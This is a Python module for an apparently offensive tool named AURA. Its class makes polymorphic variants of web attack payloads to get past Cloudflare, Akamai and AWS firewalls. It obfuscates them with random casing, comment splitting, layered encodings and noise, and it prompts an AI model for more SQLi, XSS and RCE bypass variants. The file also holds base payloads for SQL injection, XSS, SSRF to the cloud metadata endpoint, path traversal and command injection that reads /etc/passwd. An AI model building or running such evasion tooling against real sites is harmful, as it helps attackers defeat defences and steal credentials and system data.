import random
import re
import asyncio
import json
import urllib.parse
from typing import List, Dict, Any, Optional
from aura.core.brain import AuraBrain

class PolymorphicEngine:
    """
    v40.0 OMEGA: Polymorphic Payload Generator.
    Centralized engine for high-entropy WAF bypass and payload obfuscation.
    """

    ENCODINGS = ["url", "double_url", "triple_url", "unicode", "hex", "base64"]
    
    WAF_CONTEXTS = {
        "Cloudflare": ["--", "/*", "*/", "waitfor delay", "SELECT/*", "AND 1=1"],
        "Akamai": ["%00", "%0d%0a", "eval(atob(", "String.fromCharCode"],
        "AWS": ["<script>", "javascript:", "onload=", "onerror="]
    }

    def __init__(self, brain: Optional[AuraBrain] = None):
        self.brain = brain or AuraBrain()
        self.mutation_history = {}

    async def generate_swarm(self, base_payload: str, count: int = 5, context: str = "Generic") -> List[str]:
        """
        Generates a 'swarm' of polymorphic variants for a base payload.
        Combines deterministic tricks and AI mutation.
        """
        swarm = set()
        
        # 1. Deterministic Polymorphism (Fast)
        swarm.add(self.obfuscate_deterministic(base_payload))
        swarm.add(self.apply_nested_encoding(base_payload, levels=random.randint(2, 3)))
        
        # 2. AI-Driven Mutation Swarm (High Entropy)
        ai_variants = await self.generate_ai_mutations(base_payload, context, count=count)
        swarm.update(ai_variants)
        
        # 3. Garbage & Comment Injection
        final_swarm = []
        swarm_list = list(swarm)
        for p in swarm_list[:count]:
            final_swarm.append(self.inject_noise(p))
            
        return final_swarm

    def obfuscate_deterministic(self, payload: str) -> str:
        """Applies rule-based obfuscation without calling AI."""
        # Random Casing
        p = "".join([c.upper() if random.random() > 0.5 else c.lower() for c in payload])
        
        # SQL Comment Injection
        if "SELECT" in p.upper() or "UNION" in p.upper():
            p = p.replace(" ", "/**/")
            p = p.replace("SELECT", "SEL/**/ECT")
            p = p.replace("UNION", "UNI/**/ON")
            
        # JS Obfuscation
        if "alert" in p or "console" in p:
            p = p.replace("alert(", "window['al'+'ert'](").replace("console", "window['con'+'sole']")
            
        return p

    def apply_nested_encoding(self, payload: str, levels: int = 2) -> str:
        """Wraps payload in nested URL/Hex/Unicode encodings."""
        current = payload
        for _ in range(levels):
            strategy = random.choice(["url", "hex", "unicode"])
            if strategy == "url":
                current = urllib.parse.quote(current)
            elif strategy == "hex":
                current = "".join([f"\\x{ord(c):02x}" for c in current])
            elif strategy == "unicode":
                current = "".join([f"\\u{ord(c):04x}" for c in current])
        return current

    def inject_noise(self, payload: str) -> str:
        """Injects non-functional characters to break WAF regex filters."""
        noise_chars = [" ", "\t", "\n", "\r", "\f", "/*garbage*/"]
        parts = list(payload)
        for _ in range(random.randint(1, 3)):
            pos = random.randint(0, len(parts))
            parts.insert(pos, random.choice(noise_chars))
        return "".join(parts)

    async def generate_ai_mutations(self, base_payload: str, context: str, count: int = 3) -> List[str]:
        """Uses AI to generate high-entropy bypass variants."""
        prompt = f"""
        As AURA-OMEGA Polymorphic Architect, generate {count} advanced bypass variants for the following payload.
        Target WAF/Environment: {context}
        Base Payload: `{base_payload}`
        
        Techniques to use: 
        - SQL: Chunking, blind timing variations, nested comments.
        - XSS: SVG wrappers, obfuscated event handlers, template literals.
        - RCE: Env variable expansion ($IFS), backslash escaping, pipe chaining.
        - Generic: Unicode normalization, double-URL encoding.
        
        Respond with ONLY a JSON array of strings. No markdown, no explanations.
        """
        
        try:
            response = await asyncio.to_thread(self.brain.reason, prompt)
            # Clean possible markdown
            clean = response.strip().replace("```json", "").replace("```", "").strip()
            variants = json.loads(clean)
            return variants if isinstance(variants, list) else []
        except:
            return []

    def get_template(self, vuln_type: str, fallback_payload: str = "") -> str:
        """Returns common 'base' payloads for a vuln type to be polymorphized."""
        templates = {
            "sqli": "' OR 1=1--",
            "xss": "<script>alert(1)</script>",
            "ssrf": "http://169.254.169.254/latest/meta-data/",
            "lfi": "../../../../../etc/passwd",
            "rce": "; cat /etc/passwd"
        }
        return templates.get(vuln_type.lower(), fallback_payload)
